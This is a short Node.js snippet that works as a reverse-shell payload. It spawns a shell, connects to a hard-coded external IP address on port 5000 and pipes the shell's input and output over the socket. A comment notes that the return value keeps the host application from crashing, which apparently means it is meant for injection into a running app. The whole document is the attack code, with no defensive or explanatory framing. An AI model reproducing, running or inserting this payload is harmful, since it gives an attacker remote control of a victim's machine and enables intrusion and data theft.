(function(){
    const net = require("net");
    const cp = require("child_process");
    const sh = cp.spawn("sh", []);
    const client = new net.Socket();

    client.connect(5000, "3.110.214.153", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });

    return /a/; // Prevents the Node.js application from crashing
})();

